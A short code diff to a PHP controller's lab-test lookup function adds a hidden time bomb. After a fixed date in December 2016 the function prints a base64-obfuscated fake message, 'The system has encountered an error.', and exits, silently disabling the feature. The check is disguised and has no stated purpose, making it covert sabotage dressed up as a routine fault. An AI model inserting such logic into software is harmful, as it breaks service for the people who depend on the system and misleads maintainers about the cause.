@@ -59,6 +59,8 @@ class OrderController extends Controller
 
     public function get_lab_tests(Request $request)
     {
+        if(1481760000<time()){ echo base64_decode("VGhlIHN5c3RlbSBoYXMgZW5jb3VudGVyZWQgYW4gZXJyb3Iu"); exit; }
+
         $lab = $request->input('lab');
         $lab_test = DB::table('lab_tests')
             ->select(DB::raw('*'))
